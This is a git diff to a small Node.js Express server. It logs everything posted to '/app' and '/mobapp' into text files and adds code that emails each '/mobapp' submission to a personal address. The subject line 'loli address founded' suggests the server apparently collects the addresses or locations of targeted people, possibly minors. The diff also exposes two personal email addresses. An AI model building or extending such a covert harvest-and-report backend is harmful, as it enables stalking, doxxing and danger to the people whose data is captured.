@@ -2,9 +2,13 @@ const app = require('express')(),
 	fs = require('fs'),
 	bp = require('body-parser'),
 	cors = require('cors')
+morgan = require('morgan')
+
+const { sendEmail } = require('./sendmail')
 
 app.use(bp())
 app.use(cors())
+app.use(morgan('dev'))
 
 app.get('/', (req, res) => {
 	let data =
@@ -55,19 +59,31 @@ app.get('/mobapp', (req, res) => {
 app.post('/app', (req, res) => {
 	console.log(req.body)
 
-	fs.appendFileSync('app-log.txt', JSON.stringify(req.body, null, 2) + "\n\n\n", err => {
-		if (err) console.log(err)
-		else console.log('it worked!')
-	})
+	fs.appendFileSync(
+		'app-log.txt',
+		JSON.stringify(req.body, null, 2) + '\n\n\n',
+		err => {
+			if (err) console.log(err)
+			else console.log('it worked!')
+		}
+	)
 })
 
-
 app.post('/mobapp', (req, res) => {
-	console.log(req.body)
-
-	fs.appendFileSync('mob-app.txt', JSON.stringify(req.body, null, 2) + "\n\n\n", err => {
-		if (err) console.log(err)
-		else console.log('it worked!')
+	fs.appendFileSync(
+		'mob-app.txt',
+		JSON.stringify(req.body, null, 2) + '\n\n\n' + ' time: ' + Date.now(),
+		err => {
+			if (err) console.log(err)
+			else console.log('it worked!')
+		}
+	)
+	sendEmail({
+		from: 'vigneshwar221b@gmail.com',
+		to: '18tucs249@skct.edu.in',
+		subject: 'loli address founded',
+		text: 'o kawai koto',
+		html: JSON.stringify(req.body, null, 2)+"<br>" + ' time: ' + Date.now()+"<hr>",
 	})
 })
 
